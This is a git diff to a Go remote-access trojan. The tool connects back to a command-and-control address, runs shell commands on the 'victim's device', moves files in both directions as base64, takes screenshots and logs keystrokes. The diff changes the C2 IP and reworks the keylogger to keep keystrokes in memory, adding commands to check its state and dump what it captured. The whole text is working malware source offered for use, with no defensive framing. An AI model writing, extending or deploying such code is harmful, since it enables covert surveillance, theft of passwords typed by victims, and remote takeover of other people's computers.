@@ -16,19 +16,19 @@ import (
 	"strings"
 	"time"
 
-	"github.com/kbinani/screenshot"
 	"github.com/MarinX/keylogger"
+	"github.com/kbinani/screenshot"
 )
 
 const (
 	// replace the C2 variable with your C2 IP and port to connect to
-	C2 string = "127.0.0.1:54321"
+	C2 string = "192.168.43.35:54321"
 )
 
 var (
-	scrshot string = "scrshot.png"
-	keylog_flag int = 0
-	logfile string = "logs.txt"
+	scrshot     string = "scrshot.png"
+	keylog_flag int    = 0
+	keystrokes  string = ""
 )
 
 func main() {
@@ -37,6 +37,7 @@ func main() {
 	for {
 		msg, _ := bufio.NewReader(conn).ReadString('\n')
 		cmd := strings.TrimSpace(string(msg))
+		stop := make(chan bool)
 
 		if cmd == "q" || cmd == "quit" {
 			send_resp(conn, "Closing connection")
@@ -71,7 +72,7 @@ func main() {
 			} else {
 				send_resp(conn, fmt.Sprintf("%s saved successfully", file_name))
 			}
-		} else if strings.Split(cmd, " ")[0] == "download" { 
+		} else if strings.Split(cmd, " ")[0] == "download" {
 			tgt_file := strings.Split(cmd, " ")[1]
 			result := get_file(tgt_file)
 			send_resp(conn, result)
@@ -79,12 +80,70 @@ func main() {
 			if keylog_flag == 1 {
 				send_resp(conn, "Keylogger already running")
 			} else {
-				go log_keystrokes()
-				send_resp(conn, "Keylogger started successfully")
+				keylog_flag = 1
+				resp := "Keylogger started successfully"
+				go func() {
+					for {
+						select {
+						case <-stop:
+							return
+						default:
+							keyboard := keylogger.FindKeyboardDevice()
+							if len(keyboard) <= 0 {
+								resp = "No keyboard found"
+							} else {
+								if k, err := keylogger.New(keyboard); err != nil {
+									resp = err.Error()
+								} else {
+									for keylog_flag == 1 {
+										events := k.Read()
+										for e := range events {
+											switch e.Type {
+											case keylogger.EvKey:
+												if e.KeyRelease() {
+													tmp := ""
+													switch key := e.KeyString(); key {
+													case "ENTER":
+														tmp = " [ENTER] "
+													case "SHIFT":
+														tmp = " [SHIFT] "
+													case "Right":
+														tmp = "[R-ARROW]"
+													case "Left":
+														tmp = "[L-ARROW]"
+													case "Up":
+														tmp = "[U-ARROW]"
+													case "Down":
+														tmp = "[D-ARROW]"
+													default:
+														tmp = key
+													}
+													keystrokes += tmp
+												}
+											}
+										}
+									}
+								}
+							}
+						}
+					}
+				}()
+				send_resp(conn, resp)
 			}
-		} else if cmd == "keylog_stop" { 
-			keylog_flag = 0
-			send_resp(conn, dump_keystrokes())
+		} else if cmd == "keylog_state" {
+			if keylog_flag == 1 {
+				send_resp(conn, "[+] Keylogger running")
+			} else {
+				send_resp(conn, "[-] Keylogger not running")
+			}
+		} else if cmd == "keylog_dump" {
+			if keylog_flag != 1 {
+				send_resp(conn, "Keylogger not yet running")
+			} else {
+				keylog_flag = 0
+				close(stop)
+				send_resp(conn, keystrokes)
+			}
 		} else {
 			send_resp(conn, exec_cmd(cmd))
 		}
@@ -126,7 +185,7 @@ func exec_cmd(cmd string) string {
 }
 
 // check whether or not a file exists
-func file_exists(file string) (bool) {
+func file_exists(file string) bool {
 	if _, err := os.Stat(file); err != nil {
 		return false
 	} else {
@@ -135,21 +194,21 @@ func file_exists(file string) (bool) {
 }
 
 // read a file and return base64 encoding of its contents
-func file_b64(file string) (string) {
+func file_b64(file string) string {
 	content, _ := os.ReadFile(file)
 	return b64.StdEncoding.EncodeToString(content)
 }
 
 // return the base64 encoding of a file on victim's device
-func get_file(file string) (string) {
+func get_file(file string) string {
 	if !file_exists(file) {
 		return "File not found"
-	} 
+	}
 	return file_b64(file)
 }
 
 // save the uploaded file to victim's device
-func save_file(file string, b64_string string) (bool) {
+func save_file(file string, b64_string string) bool {
 	content, _ := b64.StdEncoding.DecodeString(b64_string)
 	if err := os.WriteFile(file, content, 0644); err != nil {
 		return false
@@ -159,7 +218,7 @@ func save_file(file string, b64_string string) (bool) {
 }
 
 // take a screenshot, return its base64 value and then clean up
-func take_screenshot() (string) {
+func take_screenshot() string {
 	bnds := screenshot.GetDisplayBounds(0)
 	img, _ := screenshot.CaptureRect(bnds)
 	file, _ := os.Create(scrshot)
@@ -168,34 +227,4 @@ func take_screenshot() (string) {
 	b64_string := file_b64(scrshot)
 	os.Remove(scrshot)
 	return b64_string
-}
-
-// log keystrokes for a specific amount of time
-func log_keystrokes() {
-	keyboard := keylogger.FindKeyboardDevice()
-	os.Create(logfile)
-	file, _ := os.OpenFile(logfile, os.O_APPEND, 0644)
-	if len(keyboard) <= 0 {
-		file.WriteString("No keyboard found :(")
-	}
-	if k, err := keylogger.New(keyboard); err != nil {
-		file.WriteString(err.Error())
-	} else {
-		events := k.Read()
-		for e := range events {
-			switch e.Type {
-			case keylogger.EvKey:
-				if e.KeyRelease() {
-					file.WriteString(e.KeyString())
-				}
-			}
-		}
-	}
-}
-
-// return base64 of the keystroke logs
-func dump_keystrokes() (string) {
-	keystroke_dump := file_b64(logfile)
-	os.Remove(logfile)
-	return keystroke_dump
 }
